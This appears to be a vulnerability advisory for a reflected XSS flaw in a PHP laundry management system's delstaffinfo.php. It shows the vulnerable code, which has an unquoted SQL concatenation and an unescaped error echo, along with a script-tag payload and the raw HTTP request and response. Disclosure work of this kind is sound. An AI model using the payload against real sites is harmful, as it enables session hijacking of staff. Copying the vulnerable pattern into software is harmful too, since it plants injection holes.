## SIMPLE_LAUNDRY_SYSTEM delstaffinfo.php Reflected Cross-Site Scripting Vulnerability

### I. Vulnerability Impact

The `userid` parameter of `delstaffinfo.php` is inserted into a `DELETE` statement without validation, and the MySQL error that the malformed input produces is echoed into the page together with the attacker's own characters. An attacker who sends a crafted link therefore executes arbitrary JavaScript in the browser of any staff member or administrator who opens it. The script sends no `HttpOnly` flag with its session cookie, so the injected script can read `document.cookie` and hijack the victim's staff session.

### II. Source Code Analysis

The vulnerability resides in `delstaffinfo.php`, lines 4-14:

```php
$id = $_GET['userid']; 
if (isset($id)) {
    $q="DELETE FROM staff where staffId=$id";
    $q = strtolower($q);
    if(!$mysqli->query($q)){
        echo "DELETE failed. Error: ".$mysqli->error ;
   }
   $mysqli->close();
   //redirect
     header("Refresh: 2; url=staffmanagement.php");
   echo '<h1 style="text-align: center; font-family: monospace;">DELETE SUCCESS!!</h1>';
 }
```

`$id` is taken straight from `$_GET` and appended to `staffId=` without quotes, so the value is evaluated as a SQL expression. Any non-numeric input makes the statement syntactically invalid, `$mysqli->query()` returns `false`, and line 9 writes the MySQL error message into the response with a plain `echo`.

MySQL quotes the offending fragment of the statement inside that error text, so the attacker's markup is reproduced in the HTML document with no `htmlspecialchars()`, `htmlentities()` or `strip_tags()` applied anywhere along the path. The page is served as `Content-Type: text/html; charset=UTF-8`, so the browser parses the reflected string as markup and executes the tag it contains.

Line 7 applies `strtolower()` to the whole statement, which lowercases the injected characters as well — this is why a mixed-case `<sCrIpT>` appears as `<script>` in the error message. The transformation does not neutralise anything, it only normalises the case of the payload.

The file only requires `connect.php`; there is no `session_start()` and no session check, so the reflection occurs for unauthenticated requests. Line 14 also prints `DELETE SUCCESS!!` unconditionally, even when the statement failed, which makes the page look like a successful operation.

### III. Payload

The injection payload is:

```
<sCrIpT>alert(1)</sCrIpT>
```

The parameter is unquoted in the statement, so the payload turns the query into a syntax error whose message quotes the injected fragment. After the `strtolower()` call on line 7 the statement reads:

```sql
delete from staff where staffid=<script>alert(1)</script>
```

and the error text is written into the page unmodified:

```html
DELETE failed. Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<script>alert(1)</script>' at line 1<h1 style="text-align: center; font-family: monospace;">DELETE SUCCESS!!</h1>
```

```
GET /delstaffinfo.php?userid=<sCrIpT>alert(1)</sCrIpT> HTTP/1.1
Host: bbn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/staffmanagement.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive
```

The payload is returned inside an HTML document without any encoding, which proves that the browser will parse and execute it:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 09:23:59 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Refresh: 2; url=staffmanagement.php
Content-Length: 271

DELETE failed. Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<script>alert(1)</script>' at line 1<h1 style="text-align: center; font-family: monospace;">DELETE SUCCESS!!</h1>
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030172520586](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030172520586.png)
